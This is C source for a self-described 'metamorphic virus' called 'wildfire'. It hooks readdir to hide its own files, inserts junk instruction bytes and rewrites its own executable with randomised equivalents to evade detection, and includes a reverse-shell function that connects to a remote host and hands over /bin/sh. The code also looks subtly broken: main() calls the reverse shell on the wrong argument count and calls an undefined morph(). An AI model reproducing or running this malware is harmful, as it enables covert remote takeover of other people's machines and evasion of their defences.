#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <time.h>
#include <dirent.h>
#include <unistd.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <dlfcn.h>

#define FILENAME "wildfire"

#define INC 0x40
#define DEC 0x48
#define PUSH 0x50
#define POP 0x58
#define MOV 0xB8
#define NOP 0x90


#define ADD 0x01
#define AND 0x21
#define XOR 0x31
#define OR 0x09
#define SBB 0x19
#define SUB 0x29

const unsigned char prefixes[] = { ADD, AND, XOR, OR, SBB, SUB, 0 };

#define JUNK asm __volatile__(".byte 0x50, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x58\n");
#define JUNKLEN 8

/* Binary code of the current executable */
unsigned char *code;
/* Length of the binary code */
int codelen;

struct dirent *(*original_readdir)(DIR *);
struct dirent *readdir(DIR *dirp) 
{
    struct dirent *ret;
     
    original_readdir = dlsym (RTLD_NEXT, "readdir");
    while((ret = original_readdir(dirp)))
    {
        if(strstr(ret->d_name,FILENAME) == 0 ) 
            break;
    }
    return ret;
}

/* Reads binary code from file */
void read_binary_file(const char *file_name)
{
    // Opens file in read binary mode
    FILE *fp = fopen(file_name, "rb");   JUNK;
    // Sets the file position of the stream to the given offset (0 long int)
    fseek(fp, 0L, SEEK_END);             JUNK;
    // Sets the length of the code in bytes
    codelen = ftell(fp);
    // Allocates memory to the length of the code
    code = malloc(codelen);              JUNK;
    // Sets the file position of the stream to the start of the file
    fseek(fp, 0L, SEEK_SET);
    // Reads the file into the code variable in memory
    fread(code, codelen, 1, fp);         JUNK;
    // Closes the file
    fclose(fp);
}

/* Writes binary code to file */
void write_binary_file(char *file_name)
{
    remove(file_name);

    FILE *fp = fopen(file_name, "wb");          JUNK;
    // Writes the code variable to file
    fwrite(code, codelen, 1, fp);               JUNK;
    // Closes the file
    fclose(fp);

    chmod(file_name, 0700);
}

/* Write assembly instruction */
int write_instruction(unsigned reg, int offset, int space)
{
    // Write instruction based on the amount of space available
    if (space < 2)
    {
        code[offset] = NOP;                         JUNK;
        return 1;
    }
    else if (space < 5 || rand()%2 == 0)
    {
        code[offset] = prefixes[rand()%6];          JUNK;
        code[offset+1] = 0xC0 + rand()%8*8 + reg;   JUNK;
        return 2;
    }
    else
    {
        code[offset] = MOV+reg;                     JUNK;
        *(short*)(code+offset+1) = rand();
        *(short*)(code+offset+3) = rand();          JUNK;
        return 5;
    }
}

/* Read assembly instruction */
int read_instruction(unsigned reg, int offset)
{
    // Read first instruction at offset
    unsigned c1 = code[offset];
    // Return the amount of space used for instruction
    if (c1 == NOP)
    {
        return 1;                       JUNK;
    }
    if (c1 == MOV+reg)
    {
        return 5;                       JUNK;
    }
    if (strchr(prefixes, c1))
    {
        // Read second instruction at offset
        unsigned c2 = code[offset+1];   JUNK;
        if (c2 >= 0xC0 && c2 <= 0xFF && (c2&7) == reg)
        {
            return 2;                   JUNK;
        }                               JUNK;
        return 0;
    }
}

/* Metamorphic replacement of junk */
void replace_junk(void)
{
    int i, j, inc, space;
    srand(time(NULL));                                  JUNK;
    for (i=0; i < codelen-JUNKLEN-2; i++)
    {
        unsigned start = code[i];
        unsigned end = code[i+JUNKLEN+1];
        unsigned reg = start-PUSH;

        if (start < PUSH || start >= PUSH+8) continue;  JUNK;
        if (end != POP+reg) continue;                   JUNK;

        // Register 4 is ESP (stack)
        if (reg == 4) continue;

        j = 0;                                          JUNK;
        while (inc = read_instruction(reg, i+1+j)) j += inc;
        if (j != JUNKLEN) continue;                     JUNK;

        reg = rand()%7;                                 JUNK;
        reg += (reg >= 4);
        code[i] = PUSH + reg;                           JUNK;
        code[i+JUNKLEN+1] = POP + reg;                  JUNK;

        space = JUNKLEN;
        j = 0;                                          JUNK;
        while (space)
        {
            inc = write_instruction(reg, i+1+j, space); JUNK;
            j += inc;
            space -= inc;                               JUNK;
        }
    }
}

int reverse_shell(char *remote_ip, int remote_port)
{
    struct sockaddr_in sa;
    int sock;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(remote_ip);
    sa.sin_port = htons(remote_port);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    connect(sock, (struct sockaddr *)&sa, sizeof(sa));
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    execve("/bin/sh", 0, 0);

    return 0;
}

/* Main function of metamorphic virus */
int main(int argc, char* argv[])
{
    if (argc != 3)
    {
        char *remote_ip = argv[1];
        int port = atoi(argv[2]);
        reverse_shell(remote_ip, port);
        fprintf(stderr, "%s lhost lport\n", argv[0]);
        exit(EXIT_FAILURE);
    }
    char *filename = argv[0];
    // Reads code into memory from currently running executable
    read_binary_file(filename);                                     JUNK;
    // Metamorphically changes the code in a random fashion
    // replace_junk();                                         JUNK;
    morph();
    // Write binary code to file
    write_binary_file(filename);



    exit(EXIT_SUCCESS);
}
